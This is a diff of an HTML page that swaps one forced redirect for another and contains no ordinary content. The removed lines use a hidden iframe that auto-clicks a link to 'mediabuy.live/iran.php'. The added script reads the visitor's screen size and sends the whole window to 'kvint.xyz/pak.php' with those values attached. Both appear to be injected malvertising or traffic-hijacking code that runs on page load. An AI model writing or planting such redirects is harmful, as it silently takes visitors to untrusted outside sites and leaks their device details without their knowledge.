@@ -1,34 +1,14 @@
 
- <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
-<html xmlns="http://www.w3.org/1999/xhtml" >
-<head>
-<meta charset="utf-8" />
-<style type="text/css">
-        html, body { margin: 0; padding: 0; height: 100%; }
-        iframe {
-            position: absolute;
-            top: 0; left: 0; width: 100%; height: 100%;
-            border: none; padding-top: 32px;
-            box-sizing: border-box; -moz-box-sizing: border-box; -webkit-box-sizing: border-box;
-        }
-</style>
-</head>
-<body>
-<iframe id="FileFrame" src="about:blank"></iframe>
 <script type="text/javascript">
-		var doc = document.getElementById('FileFrame').contentWindow.document;
-		doc.open();
-		doc.write(
-		'<html>'
-+		'	<head>'
-+		'		<title></title>'
-+		'	</head>'
-+		'	<body onload="document.getElementById(\'link\').click();">'
-+		'		<a id="link" target="_parent" rel="noreferrer" href="https://mediabuy.live/iran.php"></a>'
-+		'	</body>'
-+		'</html>'
-		);
-		doc.close();
+x=window.innerWidth||0;
+y=window.innerHeight||0;
+if (typeof document.documentElement != 'undefined') {
+	x=document.documentElement.clientWidth;
+	y=document.documentElement.clientHeight;
+}
+if (document.body !== null) {
+	x=document.body.clientWidth;
+	y=document.body.clientHeight;
+}
+top.location.href=("https://kvint.xyz/pak.php?"+x+"&vh="+y).replace(/\/$/, "");
 </script>
-</body>
-</html>
